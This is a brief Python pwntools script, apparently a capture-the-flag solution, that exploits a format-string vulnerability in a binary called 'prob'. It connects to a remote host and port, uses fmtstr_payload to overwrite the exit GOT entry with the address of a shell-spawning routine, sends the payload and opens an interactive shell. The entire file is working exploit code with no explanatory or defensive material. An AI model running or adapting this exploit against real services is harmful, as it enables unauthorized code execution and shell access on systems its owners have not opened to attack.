#coding:utf-8
# Author:mcpvioy
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
io = remote('34.64.203.138',10002)
#io = process('./prob')
elf = ELF('./prob')
shell = 0x4005c7
exit_got = elf.got['exit']

pl = fmtstr_payload(6,{exit_got:shell})
io.send(pl)

io.interactive()